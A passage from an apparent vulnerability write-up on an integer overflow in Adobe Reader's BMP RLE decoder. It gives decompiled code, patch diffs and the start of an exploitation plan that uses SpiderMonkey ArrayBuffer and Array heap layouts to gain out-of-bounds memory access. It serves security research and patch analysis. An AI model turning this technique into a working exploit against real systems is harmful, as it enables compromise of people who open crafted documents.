class="line">        index = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> ( (_BYTE)cmd )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">do</span></span><br><span class="line">          &#123;</span><br><span class="line">            line = (_BYTE *)fn_get_scanline(v1[<span class="number">3</span>], ypos);</span><br><span class="line">            line[xpos++] = BYTE1(cmd);</span><br><span class="line">            ++index;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">while</span> ( index &lt; (<span class="keyword">unsigned</span> __int8)cmd ); <span class="comment">// uncompress data</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( BYTE1(cmd) )        <span class="comment">// first byte = 0, second byte != 0</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( BYTE1(cmd) == <span class="number">1</span> )      <span class="comment">// end of bitmap</span></span><br><span class="line">        &#123;</span><br><span class="line">          bitmap_ends = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( BYTE1(cmd) == <span class="number">2</span> ) <span class="comment">// delta</span></span><br><span class="line">        &#123;</span><br><span class="line">          fn_read_bytes(v1[<span class="number">2</span>], &amp;xdelta, <span class="number">1u</span>);</span><br><span class="line">          fn_read_bytes(v1[<span class="number">2</span>], &amp;ydelta, <span class="number">1u</span>);</span><br><span class="line">          xpos += xdelta;           <span class="comment">// move to right</span></span><br><span class="line">          ypos -= ydelta;           <span class="comment">// move to up</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>                        <span class="comment">// uncompressed data</span></span><br><span class="line">        &#123;</span><br><span class="line">          dst_xpos = BYTE1(cmd) + xpos;</span><br><span class="line">          <span class="keyword">if</span> ( ypos &gt;= height || dst_xpos &lt; xpos || </span><br><span class="line">               dst_xpos &lt; BYTE1(cmd) || dst_xpos &gt; width )  <span class="comment">// overflow check</span></span><br><span class="line">            <span class="keyword">goto</span> LABEL_170;         <span class="comment">// CxxThrowException</span></span><br><span class="line">          index = <span class="number">0</span>;</span><br><span class="line">          <span class="keyword">if</span> ( BYTE1(cmd) )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">do</span></span><br><span class="line">            &#123;</span><br><span class="line">              fn_read_bytes(v1[<span class="number">2</span>], &amp;value, <span class="number">1u</span>);</span><br><span class="line">              line = (_BYTE *)fn_get_scanline(v1[<span class="number">3</span>], ypos);</span><br><span class="line">              line[xpos++] = value;</span><br><span class="line">              count = BYTE1(cmd);</span><br><span class="line">              ++index;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span> ( index &lt; BYTE1(cmd) );   <span class="comment">// uncompressed data</span></span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> ( count &amp; <span class="number">1</span> )                  <span class="comment">// alignment</span></span><br><span class="line">            fn_read_bytes(v1[<span class="number">2</span>], &amp;value, <span class="number">1u</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span>                                  <span class="comment">// end of line</span></span><br><span class="line">      &#123;</span><br><span class="line">        --ypos;                             <span class="comment">// move to next line</span></span><br><span class="line">        xpos = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      result = fn_feof(v1[<span class="number">2</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( !result );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Based on previous patch analysis, it’s obvious that integer overflow can be triggered in the following <code>if</code> statement.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 20CF440F, this basic block was patched in the updated binary file</span></span><br><span class="line"><span class="keyword">if</span> ( ypos &gt;= height || (<span class="keyword">unsigned</span> __int8)cmd + xpos &gt; width )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_170;                       <span class="comment">// CxxThrowException</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 20CF501F in AcroForm 2019.012.20036</span></span><br><span class="line">dst_xpos = (<span class="keyword">unsigned</span> __int8)cmd + xpos;</span><br><span class="line"><span class="keyword">if</span> ( ypos &gt;= height || dst_xpos &gt; width || </span><br><span class="line">     dst_xpos &lt; xpos || dst_xpos &lt; (<span class="keyword">unsigned</span> __int8)cmd )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_176;</span><br></pre></td></tr></table></figure><p>The flaw exists within the arithmetic computation of <code>(unsigned __int8)cmd + xpos</code> . Here the value of both variables can be controlled by the attacker. And Out-Of-Bounds write can be triggered when decompressing RLE8 compressed data.</p><ol><li>The value of <code>(unsigned __int8)cmd</code> can be controlled directly in the bitmap file</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fn_read_bytes(v1[<span class="number">2</span>], &amp;cmd, <span class="number">2u</span>);           <span class="comment">// read 2 bytes</span></span><br></pre></td></tr></table></figure><ol start="2"><li>The value of <code>xpos</code> can be controlled by arranging lots of <code>delta</code> commands in <strong>encoded mode</strong></li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( BYTE1(cmd) == <span class="number">2</span> ) <span class="comment">// delta</span></span><br><span class="line">&#123;</span><br><span class="line">  fn_read_bytes(v1[<span class="number">2</span>], &amp;xdelta, <span class="number">1u</span>);</span><br><span class="line">  fn_read_bytes(v1[<span class="number">2</span>], &amp;ydelta, <span class="number">1u</span>);</span><br><span class="line">  xpos += xdelta;           <span class="comment">// move to right, add any value in [0, 255]</span></span><br><span class="line">  ypos -= ydelta;           <span class="comment">// move to up</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="3"><li>Out-Of-Bounds write can be triggered when decompressing RLE8 compressed data</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">index = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">  line = (_BYTE *)fn_get_scanline(v1[<span class="number">3</span>], ypos);</span><br><span class="line">  line[xpos++] = BYTE1(cmd);            <span class="comment">// OOB write with constrolled data</span></span><br><span class="line">  ++index;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> ( index &lt; (<span class="keyword">unsigned</span> __int8)cmd ); <span class="comment">// uncompress data</span></span><br></pre></td></tr></table></figure><h4 id="4-2-2-RLE4-Decoding"><a href="#4-2-2-RLE4-Decoding" class="headerlink" title="4.2.2 RLE4 Decoding"></a>4.2.2 RLE4 Decoding</h4><p>Following pseudo code, which was also extracted from function <code>sub_20CF3E5F</code> , was responsible for parsing the RLE4 compressed data. The decoding process was almost the same, but it’s a little more complicated than RLE8 since the data unit was not a byte.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( bmih.biCompression == <span class="number">2</span> )  <span class="comment">// RLE4 algorithm</span></span><br><span class="line">&#123;</span><br><span class="line">  xpos = <span class="number">0</span>;                     <span class="comment">// unsigned int, from left to right</span></span><br><span class="line">  ypos = bmih.biHeight - <span class="number">1</span>;     <span class="comment">// unsigned int, from bottom to top</span></span><br><span class="line">  bitmap_ends = <span class="number">0</span>;</span><br><span class="line">  odd_index_ = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !fn_feof(v1[<span class="number">2</span>]) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( bitmap_ends )</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">      fn_read_bytes(v1[<span class="number">2</span>], &amp;cmd, <span class="number">2u</span>);       <span class="comment">// read 2 bytes</span></span><br><span class="line">      <span class="keyword">if</span> ( (_BYTE)cmd )                     <span class="comment">// first byte != 0</span></span><br><span class="line">      &#123;                                     <span class="comment">// means have compressed data</span></span><br><span class="line">        high_4bits = BYTE1(cmd) &gt;&gt; <span class="number">4</span>;       <span class="comment">// high-order 4 bits</span></span><br><span class="line">        low_4bits = BYTE1(cmd) &amp; <span class="number">0xF</span>;       <span class="comment">// low-order 4 bits</span></span><br><span class="line">        <span class="comment">// 20CF45F8, this basic block was patched in the updated binary file</span></span><br><span class="line">        <span class="keyword">if</span> ( ypos &gt;= height || (<span class="keyword">unsigned</span> __int8)cmd + xpos &gt; width )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_170;                   <span class="comment">// CxxThrowException</span></span><br><span class="line">        index = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> ( (_BYTE)cmd )</span><br><span class="line">        &#123;</span><br><span class="line">          xpos_ = odd_index_;</span><br><span class="line">          <span class="keyword">do</span></span><br><span class="line">          &#123;</span><br><span class="line">            byte_slot = xpos_ &gt;&gt; <span class="number">1</span>;</span><br><span class="line">            odd_index = index &amp; <span class="number">1</span>;</span><br><span class="line">            line = fn_get_scanline(v1[<span class="number">3</span>], ypos);</span><br><span class="line">            _4bits = high_4bits;            <span class="comment">// even index -&gt; high-order 4 bits</span></span><br><span class="line">            <span class="keyword">if</span> ( odd_index )                <span class="comment">// odd index -&gt; low-order 4 bits</span></span><br><span class="line">              _4bits = low_4bits;</span><br><span class="line">            <span class="keyword">if</span> ( xpos_ &amp; <span class="number">1</span> )                <span class="comment">// odd xpos, old byte</span></span><br><span class="line">            &#123;</span><br><span class="line">              line[byte_slot] |= _4bits;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>                            <span class="comment">// even xpos, new byte</span></span><br><span class="line">            &#123;</span><br><span class="line">              line[byte_slot] = <span class="number">16</span> * _4bits;</span><br><span class="line">            &#125;</span><br><span class="line">            ++xpos_;</span><br><span class="line">            index = index + <span class="number">1</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">while</span> ( index &lt; (<span class="keyword">unsigned</span> __int8)cmd );</span><br><span class="line">          odd_index_ = xpos_;</span><br><span class="line">          xpos = odd_index_;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( BYTE1(cmd) )                <span class="comment">// first byte = 0, second byte != 0</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( BYTE1(cmd) == <span class="number">1</span> )              <span class="comment">// end of bitmap</span></span><br><span class="line">        &#123;</span><br><span class="line">          bitmap_ends = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( BYTE1(cmd) == <span class="number">2</span> )         <span class="comment">// delta</span></span><br><span class="line">        &#123;</span><br><span class="line">          fn_read_bytes((_DWORD *)v1[<span class="number">2</span>], &amp;xdelta, <span class="number">1u</span>);</span><br><span class="line">          fn_read_bytes((_DWORD *)v1[<span class="number">2</span>], &amp;ydelta, <span class="number">1u</span>);</span><br><span class="line">          xpos += xdelta;                   <span class="comment">// move to right</span></span><br><span class="line">          ypos -= ydelta;                   <span class="comment">// move to up</span></span><br><span class="line">          odd_index_ = xpos;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">// 20CF44EA, this basic block was patched in the updated binary file</span></span><br><span class="line">          <span class="keyword">if</span> ( ypos &gt;= height || BYTE1(cmd) + xpos &gt; width )</span><br><span class="line">            <span class="keyword">goto</span> LABEL_170;                 <span class="comment">// CxxThrowException</span></span><br><span class="line">          index = <span class="number">0</span>;</span><br><span class="line">          odd_index = <span class="number">0</span>;</span><br><span class="line">          <span class="keyword">if</span> ( BYTE1(cmd) )                 <span class="comment">// uncompressed data</span></span><br><span class="line">          &#123;</span><br><span class="line">            xpos_ = odd_index_;</span><br><span class="line">            <span class="keyword">do</span></span><br><span class="line">            &#123;</span><br><span class="line">              odd_index_ = index &amp; <span class="number">1</span>;</span><br><span class="line">              <span class="keyword">if</span> ( !(index &amp; <span class="number">1</span>) )           <span class="comment">// read 1 byte data</span></span><br><span class="line">              &#123;</span><br><span class="line">                fn_read_bytes((_DWORD *)v1[<span class="number">2</span>], &amp;value, <span class="number">1u</span>);</span><br><span class="line">                low_4bits_ = value &amp; <span class="number">0xF</span>;   <span class="comment">// low-order 4 bits</span></span><br><span class="line">                high_4bits_ = value &gt;&gt; <span class="number">4</span>;   <span class="comment">// high-order 4 bits</span></span><br><span class="line">              &#125;</span><br><span class="line">              byte_slot = xpos_ &gt;&gt; <span class="number">1</span>;</span><br><span class="line">              line = fn_get_scanline(v1[<span class="number">3</span>], ypos);</span><br><span class="line">              _4bits = high_4bits_;</span><br><span class="line">              <span class="keyword">if</span> ( odd_index_ )</span><br><span class="line">                _4bits = low_4bits_;</span><br><span class="line">              <span class="keyword">if</span> ( xpos_ &amp; <span class="number">1</span> )</span><br><span class="line">              &#123;</span><br><span class="line">                line[byte_slot] |= _4bits;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">              &#123;</span><br><span class="line">                line[byte_slot] = <span class="number">16</span> * _4bits;</span><br><span class="line">              &#125;</span><br><span class="line">              ++xpos_;</span><br><span class="line">              count = BYTE1(cmd);</span><br><span class="line">              not_ended = odd_index++ + <span class="number">1</span> &lt; BYTE1(cmd);</span><br><span class="line">              index = odd_index;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span> ( not_ended );</span><br><span class="line">            odd_index_ = xpos_;</span><br><span class="line">            xpos = odd_index_;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> ( (count &amp; <span class="number">3u</span>) - <span class="number">1</span> &lt;= <span class="number">1</span> )      <span class="comment">// alignment</span></span><br><span class="line">            fn_read_bytes(v1[<span class="number">2</span>], &amp;value, <span class="number">1u</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span>                                  <span class="comment">// end of line</span></span><br><span class="line">      &#123;</span><br><span class="line">        --ypos;                             <span class="comment">// move to next line</span></span><br><span class="line">        xpos = <span class="number">0</span>;</span><br><span class="line">        odd_index_ = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      result = fn_feof((_DWORD *)v1[<span class="number">2</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( !result );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Integer overflow can be triggered in two spots, one exists within the handling of compressed data:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">high_4bits = BYTE1(cmd) &gt;&gt; <span class="number">4</span>;       <span class="comment">// high-order 4 bits</span></span><br><span class="line">low_4bits = BYTE1(cmd) &amp; <span class="number">0xF</span>;       <span class="comment">// low-order 4 bits</span></span><br><span class="line"><span class="comment">// 20CF45F8, this basic block was patched in the updated binary file</span></span><br><span class="line"><span class="keyword">if</span> ( ypos &gt;= height || (<span class="keyword">unsigned</span> __int8)cmd + xpos &gt; width )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_170;                   <span class="comment">// CxxThrowException</span></span><br></pre></td></tr></table></figure><p>Another one exists within the handling of uncompressed data:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 20CF44EA, this basic block was patched in the updated binary file</span></span><br><span class="line"><span class="keyword">if</span> ( ypos &gt;= height || BYTE1(cmd) + xpos &gt; width )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_170;                 <span class="comment">// CxxThrowException</span></span><br></pre></td></tr></table></figure><h2 id="0x05-Exploit"><a href="#0x05-Exploit" class="headerlink" title="0x05. Exploit"></a>0x05. Exploit</h2><h3 id="5-1-Overflow-Candidate"><a href="#5-1-Overflow-Candidate" class="headerlink" title="5.1 Overflow Candidate"></a>5.1 Overflow Candidate</h3><p>Three integer overflows were found within the function. Here we’ll choose the one within the handling of RLE8 data. It’s more exploit friendly than the others.</p><p>In terms of RLE4 data decoding, the value of <code>xpos</code> will be divided by <code>2</code> when putting data into the scan line. The maximum offset value for the scan line is <code>0xFFFFFFFF / 2 = 0x7FFFFFFF</code> , it means that we can only <strong>write forward</strong> and the address we are trying to write is probably out of our control.</p><p>For RLE8 data decoding, the offset value for the scan line is <code>xpos</code> itself, thus we can <strong>write backward</strong> and the distance can be controlled. In the following <code>if</code> statement, the maximum value of <code>(unsigned __int8)cmd</code> is <code>0xFF</code> . And to bypass the check, the minimum value of <code>xpos</code> is <code>0xFFFFFF01</code> which should be <code>-255</code> in <code>signed int</code> form. In other words, we can write backward as large as <code>0xFF</code> bytes.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 20CF440F, this basic block was patched in the updated binary file</span></span><br><span class="line"><span class="keyword">if</span> ( ypos &gt;= height || (<span class="keyword">unsigned</span> __int8)cmd + xpos &gt; width )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_170;                       <span class="comment">// CxxThrowException</span></span><br></pre></td></tr></table></figure><p>However, the interval we’re trying to write can only be filled with the same value. This will cause some problems when writing exploit, it will be explained later.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">index = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">  line = (_BYTE *)fn_get_scanline(v1[<span class="number">3</span>], ypos);</span><br><span class="line">  line[xpos++] = BYTE1(cmd);</span><br><span class="line">  ++index;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> ( index &lt; (<span class="keyword">unsigned</span> __int8)cmd );</span><br></pre></td></tr></table></figure><h3 id="5-2-SpiderMonkey-Concepts"><a href="#5-2-SpiderMonkey-Concepts" class="headerlink" title="5.2 SpiderMonkey Concepts"></a>5.2 SpiderMonkey Concepts</h3><p>Adobe Reader uses <a href="https://developer.mozilla.org/en-US/docs/Mozilla/Projects/SpiderMonkey" target="_blank" rel="noopener">SpiderMonkey</a> as its JavaScript engine. Before writing the exploit, let’s learn some essential knowledge of the SpiderMonkey engine.</p><h4 id="5-2-1-ArrayBuffer"><a href="#5-2-1-ArrayBuffer" class="headerlink" title="5.2.1 ArrayBuffer"></a>5.2.1 ArrayBuffer</h4><p>When the value of <code>byteLength</code> is greater than <code>0x68</code> , the backing store of the <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/ArrayBuffer" target="_blank" rel="noopener">ArrayBuffer</a> object will be allocated from system heap (through <code>ucrtbase!calloc</code>), otherwise it will be allocated from SpiderMonkey’s <strong>tenured heap</strong> . Also, when allocating from system heap, the underlying heap buffer will be <code>0x10</code> bytes larger to store the <code>ObjectElements</code> object.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ObjectElements</span> &#123;</span></span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  <span class="keyword">uint32_t</span> flags;               <span class="comment">// can be any value, default is 0</span></span><br><span class="line">  <span class="keyword">uint32_t</span> initializedLength;   <span class="comment">// byteLength</span></span><br><span class="line">  <span class="keyword">uint32_t</span> capacity;            <span class="comment">// pointer of associated view object</span></span><br><span class="line">  <span class="keyword">uint32_t</span> length;              <span class="comment">// can be any value, default is 0</span></span><br><span class="line"> <span class="comment">// ......</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>The names of the members in <code>ObjectElements</code> are meaningless for <code>ArrayBuffer</code> . Here the second member holds the <code>byteLength</code> value and the third member holds a pointer of the associated <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/DataView" target="_blank" rel="noopener">DataView</a> object. The values of the other members are meaningless and can be any digits.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ab = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x70</span>);</span><br><span class="line"><span class="keyword">var</span> dv = <span class="keyword">new</span> <span class="built_in">DataView</span>(ab);</span><br><span class="line">dv.setUint32(<span class="number">0</span>, <span class="number">0x41424344</span>, <span class="literal">true</span>);</span><br></pre></td></tr></table></figure><p>When executing the above JavaScript code in Adobe Reader, the backing store of the <code>ArrayBuffer</code> object will be looked like this:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">;            -, byteLength, viewobj,       -,</span><br><span class="line">34d54f80  00000000 00000070 2458f608 00000000</span><br><span class="line">;         data</span><br><span class="line">34d54f90  41424344 00000000 00000000 00000000</span><br><span class="line">34d54fa0  00000000 00000000 00000000 00000000</span><br><span class="line">34d54fb0  00000000 00000000 00000000 00000000</span><br><span class="line">34d54fc0  00000000 00000000 00000000 00000000</span><br><span class="line">34d54fd0  00000000 00000000 00000000 00000000</span><br><span class="line">34d54fe0  00000000 00000000 00000000 00000000</span><br><span class="line">34d54ff0  00000000 00000000 00000000 00000000</span><br></pre></td></tr></table></figure><p>If we can change the value of the <code>byteLength</code> of <code>ArrayBuffer</code> , then we can achieve Out-Of-Bounds access. But be careful with the pointer of the associated <code>DataView</code> object, it can only be 0 or a valid <code>DataView</code> pointer, the process may crash immediately if we change it to some other values.</p><h4 id="5-2-2-Array"><a href="#5-2-2-Array" class="headerlink" title="5.2.2 Array"></a>5.2.2 Array</h4><p>When the value of <code>length</code> is greater than <code>14</code> , the <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array" target="_blank" rel="noopener">Array</a> object can be allocated from system heap (through <code>ucrtbase!calloc</code>), otherwise it may be allocated from SpiderMonkey’s <strong>nursery heap</strong> . Also, when allocating from system heap, the underlying heap buffer will be <code>0x10</code> bytes larger to store the <code>ObjectElements</code> object.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ObjectElements</span> &#123;</span></span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  <span class="comment">// The NumShiftedElementsBits high bits of this are used to store the</span></span><br><span class="line">  <span class="comment">// number of shifted elements, the other bits are available for the flags.</span></span><br><span class="line">  <span class="comment">// See Flags enum above.</span></span><br><span class="line">  <span class="keyword">uint32_t</span> flags;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">   * Number of initialized elements. This is &lt;= the capacity, and for arrays</span></span><br><span class="line"><span class="comment">   * is &lt;= the length. Memory for elements above the initialized length is</span></span><br><span class="line"><span class="comment">   * uninitialized, but values between the initialized length and the proper</span></span><br><span class="line"><span class="comment">   * length are conceptually holes.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">uint32_t</span> initializedLength;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Number of allocated slots. */</span></span><br><span class="line">  <span class="keyword">uint32_t</span> capacity;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 'length' property of array objects, unused for other objects. */</span></span><br><span class="line">  <span class="keyword">uint32_t</span> length;</span><br><span class="line"> <span class="comment">// ......</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> array = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">15</span>);</span><br><span class="line">array[<span class="number">0</span>] = array[array.length - <span class="number">1</span>] = <span class="number">0x41424344</span>;</span><br></pre></td></tr></table></figure><p>When executing the above JavaScript code in Adobe Reader, the underlying storage buffer of the <code>Array</code> object will be looked like this:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">0:010&gt; dd 34cb0f88-10 L90/4</span><br><span class="line">34cb0f78  00000000 0000000f 0000000f 0000000f</span><br><span class="line">34cb0f88  41424344 ffffff81 00000000 ffffff84 ; [0], [1]</span><br><span class="line">34cb0f98  00000000 ffffff84 00000000 ffffff84</span><br><span class="line">34cb0fa8  00000000 ffffff84 00000000 ffffff84</span><br><span class="line">34cb0fb8  00000000 ffffff84 00000000 ffffff84</span><br><span class="line">34cb0fc8  00000000 ffffff84 00000000 ffffff84</span><br><span class="line">34cb0fd8  00000000 ffffff84 00000000 ffffff84</span><br><span class="line">34cb0fe8  00000000 ffffff84 00000000 ffffff84</span><br><span class="line">34cb0ff8  41424344 ffffff81 ???????? ???????? ; [14]</span><br></pre></td></tr></table></figure><p>The contents of both <code>array[0]</code> and <code>array[14]</code> are <code>41424344 ffffff81</code> , here the higher four bytes of data <code>0xFFFFFF81</code> indicates that the type of the element is <code>INT32</code> . And the contents of the elements within <code>[1, 13]</code> are all filled with <code>00000000 